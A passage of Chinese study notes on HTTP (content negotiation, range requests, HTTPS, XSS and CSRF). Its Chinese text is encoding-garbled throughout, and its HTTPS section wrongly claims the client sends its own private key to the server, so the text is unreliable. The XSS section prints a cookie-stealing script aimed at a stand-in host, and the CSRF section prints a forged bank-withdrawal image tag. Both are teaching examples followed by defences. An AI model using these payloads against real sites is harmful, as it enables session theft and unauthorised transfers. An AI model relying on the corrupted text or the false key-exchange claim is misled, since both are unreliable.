å®¢æˆ·ç«¯è®¾ç½®ç‰¹å®šçš„ HTTP é¦–éƒ¨å­—æ®µï¼Œä¾‹å¦‚ Acceptã€Accept-Charsetã€Accept-Encodingã€Accept-Languageã€Content-Languagï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™äº›å­—æ®µè¿”å›ç‰¹å®šçš„èµ„æºã€‚ å®ƒå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š æœåŠ¡å™¨å¾ˆéš¾çŸ¥é“å®¢æˆ·ç«¯æµè§ˆå™¨çš„å…¨éƒ¨ä¿¡æ¯ï¼› å®¢æˆ·ç«¯æä¾›çš„ä¿¡æ¯ç›¸å½“å†—é•¿ï¼ˆHTTP/2 åè®®çš„é¦–éƒ¨å‹ç¼©æœºåˆ¶ç¼“è§£äº†è¿™ä¸ªé—®é¢˜ï¼‰ï¼Œå¹¶ä¸”å­˜åœ¨éšç§é£é™©ï¼ˆHTTP æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼‰ã€‚ ç»™å®šçš„èµ„æºéœ€è¦è¿”å›ä¸åŒçš„å±•ç°å½¢å¼ï¼Œå…±äº«ç¼“å­˜çš„æ•ˆç‡ä¼šé™ä½ï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„å®ç°ä¼šè¶Šæ¥è¶Šå¤æ‚ã€‚ ï¼ˆäºŒï¼‰ä»£ç†é©±åŠ¨å‹åå•† æœåŠ¡å™¨è¿”å› 300 Multiple Choices æˆ–è€… 406 Not Acceptableï¼Œå®¢æˆ·ç«¯ä»ä¸­é€‰å‡ºæœ€åˆé€‚çš„é‚£ä¸ªèµ„æºã€‚ 2. Vary1Vary: Accept-Language åœ¨ä½¿ç”¨å†…å®¹åå•†çš„æƒ…å†µä¸‹ï¼Œåªæœ‰å½“ç¼“å­˜æœåŠ¡å™¨ä¸­çš„ç¼“å­˜æ»¡è¶³å†…å®¹åå•†æ¡ä»¶æ—¶ï¼Œæ‰èƒ½ä½¿ç”¨è¯¥ç¼“å­˜ï¼Œå¦åˆ™åº”è¯¥å‘æºæœåŠ¡å™¨è¯·æ±‚è¯¥èµ„æºã€‚ ä¾‹å¦‚ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªåŒ…å« Accept-Language é¦–éƒ¨å­—æ®µçš„è¯·æ±‚ä¹‹åï¼ŒæºæœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« Vary: Accept-Language å†…å®¹ï¼Œç¼“å­˜æœåŠ¡å™¨å¯¹è¿™ä¸ªå“åº”è¿›è¡Œç¼“å­˜ä¹‹åï¼Œåœ¨å®¢æˆ·ç«¯ä¸‹ä¸€æ¬¡è®¿é—®åŒä¸€ä¸ª URL èµ„æºï¼Œå¹¶ä¸” Accept-Language ä¸ç¼“å­˜ä¸­çš„å¯¹åº”çš„å€¼ç›¸åŒæ—¶æ‰ä¼šè¿”å›è¯¥ç¼“å­˜ã€‚ å†…å®¹ç¼–ç å†…å®¹ç¼–ç å°†å®ä½“ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œä»è€Œå‡å°‘ä¼ è¾“çš„æ•°æ®é‡ã€‚å¸¸ç”¨çš„å†…å®¹ç¼–ç æœ‰ï¼šgzipã€compressã€deflateã€identityã€‚ æµè§ˆå™¨å‘é€ Accept-Encoding é¦–éƒ¨ï¼Œå…¶ä¸­åŒ…å«æœ‰å®ƒæ‰€æ”¯æŒçš„å‹ç¼©ç®—æ³•ï¼Œä»¥åŠå„è‡ªçš„ä¼˜å…ˆçº§ï¼ŒæœåŠ¡å™¨åˆ™ä»ä¸­é€‰æ‹©ä¸€ç§ï¼Œä½¿ç”¨è¯¥ç®—æ³•å¯¹å“åº”çš„æ¶ˆæ¯ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¸”å‘é€ Content-Encoding é¦–éƒ¨æ¥å‘ŠçŸ¥æµè§ˆå™¨å®ƒé€‰æ‹©äº†å“ªä¸€ç§ç®—æ³•ã€‚ç”±äºè¯¥å†…å®¹åå•†è¿‡ç¨‹æ˜¯åŸºäºç¼–ç ç±»å‹æ¥é€‰æ‹©èµ„æºçš„å±•ç°å½¢å¼çš„ï¼Œåœ¨å“åº”ä¸­ï¼ŒVary é¦–éƒ¨ä¸­è‡³å°‘è¦åŒ…å« Content-Encodingï¼Œè¿™æ ·çš„è¯ï¼Œç¼“å­˜æœåŠ¡å™¨å°±å¯ä»¥å¯¹èµ„æºçš„ä¸åŒå±•ç°å½¢å¼è¿›è¡Œç¼“å­˜ã€‚ èŒƒå›´è¯·æ±‚å¦‚æœç½‘ç»œå‡ºç°ä¸­æ–­ï¼ŒæœåŠ¡å™¨åªå‘é€äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼ŒèŒƒå›´è¯·æ±‚å¯ä»¥ä½¿å¾—å®¢æˆ·ç«¯åªè¯·æ±‚æœåŠ¡å™¨æœªå‘é€çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œä»è€Œé¿å…æœåŠ¡å™¨é‡æ–°å‘é€æ‰€æœ‰æ•°æ®ã€‚ 1. Rangeåœ¨è¯·æ±‚æŠ¥æ–‡ä¸­æ·»åŠ  Range é¦–éƒ¨å­—æ®µæŒ‡å®šè¯·æ±‚çš„èŒƒå›´ã€‚ 123GET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023 è¯·æ±‚æˆåŠŸçš„è¯æœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« 206 Partial Content çŠ¶æ€ç ã€‚ 12345HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content) 2. Accept-Rangeså“åº”é¦–éƒ¨å­—æ®µ Accept-Ranges ç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤„ç†èŒƒå›´è¯·æ±‚ï¼Œå¯ä»¥å¤„ç†ä½¿ç”¨ bytesï¼Œå¦åˆ™ä½¿ç”¨ noneã€‚ 1Accept-Ranges: bytes 3. å“åº”çŠ¶æ€ç  åœ¨è¯·æ±‚æˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 206 Partial Content çŠ¶æ€ç ã€‚ åœ¨è¯·æ±‚çš„èŒƒå›´è¶Šç•Œçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 416 Requested Range Not Satisfiable çŠ¶æ€ç ã€‚ åœ¨ä¸æ”¯æŒèŒƒå›´è¯·æ±‚çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 200 OK çŠ¶æ€ç ã€‚ åˆ†å—ä¼ è¾“ç¼–ç Chunked Transfer Codingï¼Œå¯ä»¥æŠŠæ•°æ®åˆ†å‰²æˆå¤šå—ï¼Œè®©æµè§ˆå™¨é€æ­¥æ˜¾ç¤ºé¡µé¢ã€‚ å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆä¸€ä»½æŠ¥æ–‡ä¸»ä½“å†…å¯å«æœ‰å¤šç§ç±»å‹çš„å®ä½“åŒæ—¶å‘é€ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨ boundary å­—æ®µå®šä¹‰çš„åˆ†éš”ç¬¦è¿›è¡Œåˆ†éš”ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥æœ‰é¦–éƒ¨å­—æ®µã€‚ ä¾‹å¦‚ï¼Œä¸Šä¼ å¤šä¸ªè¡¨å•æ—¶å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼š 123456789101112Content-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name="submit-name"Larry--AaB03xContent-Disposition: form-data; name="files"; filename="file1.txt"Content-Type: text/plain... contents of file1.txt ...--AaB03x-- è™šæ‹Ÿä¸»æœºHTTP/1.1 ä½¿ç”¨è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä½¿å¾—ä¸€å°æœåŠ¡å™¨æ‹¥æœ‰å¤šä¸ªåŸŸåï¼Œå¹¶ä¸”åœ¨é€»è¾‘ä¸Šå¯ä»¥çœ‹æˆå¤šä¸ªæœåŠ¡å™¨ã€‚ é€šä¿¡æ•°æ®è½¬å‘1. ä»£ç†ä»£ç†æœåŠ¡å™¨æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”è½¬å‘ç»™å…¶å®ƒæœåŠ¡å™¨ã€‚ ä½¿ç”¨ä»£ç†çš„ä¸»è¦ç›®çš„æ˜¯ï¼š ç¼“å­˜ è´Ÿè½½å‡è¡¡ ç½‘ç»œè®¿é—®æ§åˆ¶ è®¿é—®æ—¥å¿—è®°å½• ä»£ç†æœåŠ¡å™¨åˆ†ä¸ºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ä¸¤ç§ï¼Œç”¨æˆ·å¯Ÿè§‰å¾—åˆ°æ­£å‘ä»£ç†çš„å­˜åœ¨ï¼Œè€Œåå‘ä»£ç†ä¸€èˆ¬ä½äºå†…éƒ¨ç½‘ç»œä¸­ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸åˆ°ã€‚ 2. ç½‘å…³ä¸ä»£ç†æœåŠ¡å™¨ä¸åŒçš„æ˜¯ï¼Œç½‘å…³æœåŠ¡å™¨ä¼šå°† HTTP è½¬åŒ–ä¸ºå…¶å®ƒåè®®è¿›è¡Œé€šä¿¡ï¼Œä»è€Œè¯·æ±‚å…¶å®ƒé HTTP æœåŠ¡å™¨çš„æœåŠ¡ã€‚ 3. éš§é“ä½¿ç”¨ SSL ç­‰åŠ å¯†æ‰‹æ®µï¼Œä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡å®‰å…¨çš„é€šä¿¡çº¿è·¯ã€‚ å…­ã€HTTPsHTTP æœ‰ä»¥ä¸‹å®‰å…¨æ€§é—®é¢˜ï¼š ä½¿ç”¨æ˜æ–‡è¿›è¡Œé€šä¿¡ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ï¼› ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œé€šä¿¡æ–¹çš„èº«ä»½æœ‰å¯èƒ½é­é‡ä¼ªè£…ï¼› æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼ŒæŠ¥æ–‡æœ‰å¯èƒ½é­ç¯¡æ”¹ã€‚ HTTPs å¹¶ä¸æ˜¯æ–°åè®®ï¼Œè€Œæ˜¯è®© HTTP å…ˆå’Œ SSLï¼ˆSecure Sockets Layerï¼‰é€šä¿¡ï¼Œå†ç”± SSL å’Œ TCP é€šä¿¡ã€‚ä¹Ÿå°±æ˜¯è¯´ HTTPs ä½¿ç”¨äº†éš§é“è¿›è¡Œé€šä¿¡ã€‚ é€šè¿‡ä½¿ç”¨ SSLï¼ŒHTTPs å…·æœ‰äº†åŠ å¯†ï¼ˆé˜²çªƒå¬ï¼‰ã€è®¤è¯ï¼ˆé˜²ä¼ªè£…ï¼‰å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆé˜²ç¯¡æ”¹ï¼‰ã€‚ åŠ å¯†1. å¯¹ç§°å¯†é’¥åŠ å¯†å¯¹ç§°å¯†é’¥åŠ å¯†ï¼ˆSymmetric-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€å¯†é’¥ã€‚ ä¼˜ç‚¹ï¼šè¿ç®—é€Ÿåº¦å¿«ï¼› ç¼ºç‚¹ï¼šæ— æ³•å®‰å…¨åœ°å°†å¯†é’¥ä¼ è¾“ç»™é€šä¿¡æ–¹ã€‚ 2.éå¯¹ç§°å¯†é’¥åŠ å¯†éå¯¹ç§°å¯†é’¥åŠ å¯†ï¼Œåˆç§°å…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ã€‚ å…¬å¼€å¯†é’¥æ‰€æœ‰äººéƒ½å¯ä»¥è·å¾—ï¼Œé€šä¿¡å‘é€æ–¹è·å¾—æ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°é€šä¿¡å†…å®¹åä½¿ç”¨ç§æœ‰å¯†é’¥è§£å¯†ã€‚ éå¯¹ç§°å¯†é’¥é™¤äº†ç”¨æ¥åŠ å¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œç­¾åã€‚å› ä¸ºç§æœ‰å¯†é’¥æ— æ³•è¢«å…¶ä»–äººè·å–ï¼Œå› æ­¤é€šä¿¡å‘é€æ–¹ä½¿ç”¨å…¶ç§æœ‰å¯†é’¥è¿›è¡Œç­¾åï¼Œé€šä¿¡æ¥æ”¶æ–¹ä½¿ç”¨å‘é€æ–¹çš„å…¬å¼€å¯†é’¥å¯¹ç­¾åè¿›è¡Œè§£å¯†ï¼Œå°±èƒ½åˆ¤æ–­è¿™ä¸ªç­¾åæ˜¯å¦æ­£ç¡®ã€‚ ä¼˜ç‚¹ï¼šå¯ä»¥æ›´å®‰å…¨åœ°å°†å…¬å¼€å¯†é’¥ä¼ è¾“ç»™é€šä¿¡å‘é€æ–¹ï¼› ç¼ºç‚¹ï¼šè¿ç®—é€Ÿåº¦æ…¢ã€‚ 3. HTTPs é‡‡ç”¨çš„åŠ å¯†æ–¹å¼HTTPs é‡‡ç”¨æ··åˆçš„åŠ å¯†æœºåˆ¶ï¼Œä½¿ç”¨éå¯¹ç§°å¯†é’¥åŠ å¯†ç”¨äºä¼ è¾“å¯¹ç§°å¯†é’¥æ¥ä¿è¯å®‰å…¨æ€§ï¼Œä¹‹åä½¿ç”¨å¯¹ç§°å¯†é’¥åŠ å¯†è¿›è¡Œé€šä¿¡æ¥ä¿è¯æ•ˆç‡ã€‚ï¼ˆä¸‹å›¾ä¸­çš„ Session Key å°±æ˜¯å¯¹ç§°å¯†é’¥ï¼‰ è®¤è¯é€šè¿‡ä½¿ç”¨ è¯ä¹¦ æ¥å¯¹é€šä¿¡æ–¹è¿›è¡Œè®¤è¯ã€‚ æ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼ˆCAï¼ŒCertificate Authorityï¼‰æ˜¯å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨åŒæ–¹éƒ½å¯ä¿¡èµ–çš„ç¬¬ä¸‰æ–¹æœºæ„ã€‚ æœåŠ¡å™¨çš„è¿è¥äººå‘˜å‘ CA æå‡ºå…¬å¼€å¯†é’¥çš„ç”³è¯·ï¼ŒCA åœ¨åˆ¤æ˜æå‡ºç”³è¯·è€…çš„èº«ä»½ä¹‹åï¼Œä¼šå¯¹å·²ç”³è¯·çš„å…¬å¼€å¯†é’¥åšæ•°å­—ç­¾åï¼Œç„¶ååˆ†é…è¿™ä¸ªå·²ç­¾åçš„å…¬å¼€å¯†é’¥ï¼Œå¹¶å°†è¯¥å…¬å¼€å¯†é’¥æ”¾å…¥å…¬å¼€å¯†é’¥è¯ä¹¦åç»‘å®šåœ¨ä¸€èµ·ã€‚ è¿›è¡Œ HTTPs é€šä¿¡æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæŠŠè¯ä¹¦å‘é€ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å–å¾—å…¶ä¸­çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå…ˆä½¿ç”¨æ•°å­—ç­¾åè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œå°±å¯ä»¥å¼€å§‹é€šä¿¡äº†ã€‚ é€šä¿¡å¼€å§‹æ—¶ï¼Œå®¢æˆ·ç«¯éœ€è¦ä½¿ç”¨æœåŠ¡å™¨çš„å…¬å¼€å¯†é’¥å°†è‡ªå·±çš„ç§æœ‰å¯†é’¥ä¼ è¾“ç»™æœåŠ¡å™¨ï¼Œä¹‹åå†è¿›è¡Œå¯¹ç§°å¯†é’¥åŠ å¯†ã€‚ å®Œæ•´æ€§ä¿æŠ¤SSL æä¾›æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½æ¥è¿›è¡Œå®Œæ•´æ€§ä¿æŠ¤ã€‚ HTTP ä¹Ÿæä¾›äº† MD5 æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ï¼Œä½†ä¸æ˜¯å®‰å…¨çš„ã€‚ä¾‹å¦‚æŠ¥æ–‡å†…å®¹è¢«ç¯¡æ”¹ä¹‹åï¼ŒåŒæ—¶é‡æ–°è®¡ç®— MD5 çš„å€¼ï¼Œé€šä¿¡æ¥æ”¶æ–¹æ˜¯æ— æ³•æ„è¯†åˆ°å‘ç”Ÿäº†ç¯¡æ”¹ã€‚ HTTPs çš„æŠ¥æ–‡æ‘˜è¦åŠŸèƒ½ä¹‹æ‰€ä»¥å®‰å…¨ï¼Œæ˜¯å› ä¸ºå®ƒç»“åˆäº†åŠ å¯†å’Œè®¤è¯è¿™ä¸¤ä¸ªæ“ä½œã€‚è¯•æƒ³ä¸€ä¸‹ï¼ŒåŠ å¯†ä¹‹åçš„æŠ¥æ–‡ï¼Œé­åˆ°ç¯¡æ”¹ä¹‹åï¼Œä¹Ÿå¾ˆéš¾é‡æ–°è®¡ç®—æŠ¥æ–‡æ‘˜è¦ï¼Œå› ä¸ºæ— æ³•è½»æ˜“è·å–æ˜æ–‡ã€‚ HTTPs çš„ç¼ºç‚¹ å› ä¸ºéœ€è¦è¿›è¡ŒåŠ å¯†è§£å¯†ç­‰è¿‡ç¨‹ï¼Œå› æ­¤é€Ÿåº¦ä¼šæ›´æ…¢ï¼› éœ€è¦æ”¯ä»˜è¯ä¹¦æˆæƒçš„é«˜è´¹ç”¨ã€‚ é…ç½® HTTPsNginx é…ç½® HTTPS æœåŠ¡å™¨ ä¸ƒã€Web æ”»å‡»æŠ€æœ¯è·¨ç«™è„šæœ¬æ”»å‡»1. æ¦‚å¿µè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scripting, XSSï¼‰ï¼Œå¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œè¿™ç§ä»£ç åŒ…æ‹¬ HTML å’Œ JavaScriptã€‚ ä¾‹å¦‚æœ‰ä¸€ä¸ªè®ºå›ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸Šé¢å‘å¸ƒä»¥ä¸‹å†…å®¹ï¼š 1&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt; ä¹‹åè¯¥å†…å®¹å¯èƒ½ä¼šè¢«æ¸²æŸ“æˆä»¥ä¸‹å½¢å¼ï¼š 1&lt;p&gt;&lt;script&gt;location.href="//domain.com/?c=" + document.cookie&lt;/script&gt;&lt;/p&gt; å¦ä¸€ä¸ªç”¨æˆ·æµè§ˆäº†å«æœ‰è¿™ä¸ªå†…å®¹çš„é¡µé¢å°†ä¼šè·³è½¬åˆ° domain.com å¹¶æºå¸¦äº†å½“å‰ä½œç”¨åŸŸçš„ Cookieã€‚å¦‚æœè¿™ä¸ªè®ºå›ç½‘ç«™é€šè¿‡ Cookie ç®¡ç†ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ª Cookie ç™»å½•è¢«æ”»å‡»è€…çš„è´¦å·äº†ã€‚ 2. å±å®³ çªƒå–ç”¨æˆ·çš„ Cookie å€¼ ä¼ªé€ è™šå‡çš„è¾“å…¥è¡¨å•éª—å–ä¸ªäººä¿¡æ¯ æ˜¾ç¤ºä¼ªé€ çš„æ–‡ç« æˆ–è€…å›¾ç‰‡ 3. é˜²èŒƒæ‰‹æ®µï¼ˆä¸€ï¼‰è®¾ç½® Cookie ä¸º HttpOnly è®¾ç½®äº† HttpOnly çš„ Cookie å¯ä»¥é˜²æ­¢ JavaScript è„šæœ¬è°ƒç”¨ï¼Œå°±æ— æ³•é€šè¿‡ document.cookie è·å–ç”¨æˆ· Cookie ä¿¡æ¯ã€‚ ï¼ˆäºŒï¼‰è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦ ä¾‹å¦‚å°† &lt; è½¬ä¹‰ä¸º &amp;lt;ï¼Œå°† &gt; è½¬ä¹‰ä¸º &amp;gt;ï¼Œä»è€Œé¿å… HTML å’Œ Jascript ä»£ç çš„è¿è¡Œã€‚ ï¼ˆä¸‰ï¼‰å¯Œæ–‡æœ¬ç¼–è¾‘å™¨çš„å¤„ç† å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å…è®¸ç”¨æˆ·è¾“å…¥ HTML ä»£ç ï¼Œå°±ä¸èƒ½ç®€å•åœ°å°† &lt; ç­‰å­—ç¬¦è¿›è¡Œè¿‡æ»¤äº†ï¼Œæå¤§åœ°æé«˜äº† XSS æ”»å‡»çš„å¯èƒ½æ€§ã€‚ å¯Œæ–‡æœ¬ç¼–è¾‘å™¨é€šå¸¸é‡‡ç”¨ XSS filter æ¥é˜²èŒƒ XSS æ”»å‡»ï¼Œå¯ä»¥å®šä¹‰ä¸€äº›æ ‡ç­¾ç™½åå•æˆ–è€…é»‘åå•ï¼Œä»è€Œä¸å…è®¸æœ‰æ”»å‡»æ€§çš„ HTML ä»£ç çš„è¾“å…¥ã€‚ ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œform å’Œ script ç­‰æ ‡ç­¾éƒ½è¢«è½¬ä¹‰ï¼Œè€Œ h å’Œ p ç­‰æ ‡ç­¾å°†ä¼šä¿ç•™ã€‚ XSS è¿‡æ»¤åœ¨çº¿æµ‹è¯• 1234567891011121314151617181920212223242526&lt;h1 id="title"&gt;XSS Demo&lt;/h1&gt;&lt;p class="text-center"&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&lt;form&gt; &lt;input type="text" name="q" value="test"&gt; &lt;button id="submit"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&lt;script type="text/javascript"&gt;alert(/xss/);&lt;/script&gt; 1234567891011121314151617181920212223242526&lt;h1&gt;XSS Demo&lt;/h1&gt;&lt;p&gt;Sanitize untrusted HTML (to prevent XSS) with a configuration specified by a Whitelist.&lt;/p&gt;&amp;lt;form&amp;gt; &amp;lt;input type="text" name="q" value="test"&amp;gt; &amp;lt;button id="submit"&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&lt;pre&gt;hello&lt;/pre&gt;&lt;p&gt; &lt;a href="http://jsxss.com"&gt;http&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Features:&lt;/h3&gt;&lt;ul&gt; &lt;li&gt;Specifies HTML tags and their attributes allowed with whitelist&lt;/li&gt; &lt;li&gt;Handle any tags or attributes using custom function&lt;/li&gt;&lt;/ul&gt;&amp;lt;script type="text/javascript"&amp;gt;alert(/xss/);&amp;lt;/script&amp;gt; è·¨ç«™è¯·æ±‚ä¼ªé€ 1. æ¦‚å¿µè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼ŒCSRFï¼‰ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»æ‰§è¡Œã€‚ XSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·æµè§ˆå™¨çš„ä¿¡ä»»ã€‚ å‡å¦‚ä¸€å®¶é“¶è¡Œç”¨ä»¥æ‰§è¡Œè½¬è´¦æ“ä½œçš„ URL åœ°å€å¦‚ä¸‹ï¼š 1http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeNameã€‚ é‚£ä¹ˆï¼Œä¸€ä¸ªæ¶æ„æ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šæ”¾ç½®å¦‚ä¸‹ä»£ç ï¼š 1&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;ã€‚ å¦‚æœæœ‰è´¦æˆ·åä¸º Alice çš„ç”¨æˆ·è®¿é—®äº†æ¶æ„ç«™ç‚¹ï¼Œè€Œå¥¹ä¹‹å‰åˆšè®¿é—®è¿‡é“¶è¡Œä¸ä¹…ï¼Œç™»å½•ä¿¡æ¯å°šæœªè¿‡æœŸï¼Œé‚£ä¹ˆå¥¹å°±ä¼šæŸå¤± 1000 èµ„é‡‘ã€‚ è¿™ç§æ¶æ„çš„ç½‘å€å¯ä»¥æœ‰å¾ˆå¤šç§å½¢å¼ï¼Œè—èº«äºç½‘é¡µä¸­çš„è®¸å¤šåœ°æ–¹ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…ä¹Ÿä¸éœ€è¦æ§åˆ¶æ”¾ç½®æ¶æ„ç½‘å€çš„ç½‘ç«™ã€‚ä¾‹å¦‚ä»–å¯ä»¥å°†è¿™ç§åœ°å€è—åœ¨è®ºå›ï¼Œåšå®¢ç­‰ä»»ä½•ç”¨æˆ·ç”Ÿæˆå†…å®¹çš„ç½‘ç«™ä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæœåŠ¡å™¨ç«¯æ²¡æœ‰åˆé€‚çš„é˜²å¾¡æªæ–½çš„è¯ï¼Œç”¨æˆ·å³ä½¿è®¿é—®ç†Ÿæ‚‰çš„å¯ä¿¡ç½‘ç«™ä¹Ÿæœ‰å—æ”»å‡»çš„å±é™©ã€‚ é€è¿‡ä¾‹å­èƒ½å¤Ÿçœ‹å‡ºï¼Œæ”»å‡»è€…å¹¶ä¸èƒ½é€šè¿‡ CSRF æ”»å‡»æ¥ç›´æ¥è·å–ç”¨æˆ·çš„è´¦æˆ·æ§åˆ¶æƒï¼Œä¹Ÿä¸èƒ½ç›´æ¥çªƒå–ç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ã€‚ä»–ä»¬èƒ½åšåˆ°çš„ï¼Œæ˜¯æ¬ºéª—ç”¨æˆ·æµè§ˆå™¨ï¼Œè®©å…¶ä»¥ç”¨æˆ·çš„åä¹‰æ‰§è¡Œæ“ä½œã€‚ 2. é˜²èŒƒæ‰‹æ®µï¼ˆä¸€ï¼‰æ£€æŸ¥ Referer é¦–éƒ¨å­—æ®µ Referer é¦–éƒ¨å­—æ®µä½äº HTTP æŠ¥æ–‡ä¸­ï¼Œç”¨äºæ ‡è¯†è¯·æ±‚æ¥æºçš„åœ°å€ã€‚æ£€æŸ¥è¿™ä¸ªé¦–éƒ¨å­—æ®µå¹¶è¦æ±‚è¯·æ±‚æ¥æºçš„åœ°å€åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ï¼Œå¯ä»¥æå¤§çš„é˜²æ­¢ XSRF æ”»å‡»ã€‚ è¿™ç§åŠæ³•ç®€å•æ˜“è¡Œï¼Œå·¥ä½œé‡ä½ï¼Œä»…éœ€è¦åœ¨å…³é”®è®¿é—®å¤„å¢åŠ ä¸€æ­¥æ ¡éªŒã€‚ä½†è¿™ç§åŠæ³•ä¹Ÿæœ‰å…¶å±€é™æ€§ï¼Œå› å…¶å®Œå…¨ä¾èµ–æµè§ˆå™¨å‘é€æ­£ç¡®çš„ Referer å­—æ®µã€‚è™½ç„¶ HTTP åè®®å¯¹æ­¤å­—æ®µçš„å†…å®¹æœ‰æ˜ç¡®çš„è§„å®šï¼Œä½†å¹¶æ— æ³•ä¿è¯æ¥è®¿çš„æµè§ˆå™¨çš„å…·ä½“å®ç°ï¼Œäº¦æ— æ³•ä¿è¯æµè§ˆå™¨æ²¡æœ‰å®‰å…¨æ¼æ´å½±å“åˆ°æ­¤å­—æ®µã€‚å¹¶ä¸”ä¹Ÿå­˜åœ¨æ”»å‡»è€…æ”»å‡»æŸäº›æµè§ˆå™¨ï¼Œç¯¡æ”¹å…¶ Referer å­—æ®µçš„å¯èƒ½ã€‚ ï¼ˆäºŒï¼‰æ·»åŠ æ ¡éªŒ Token 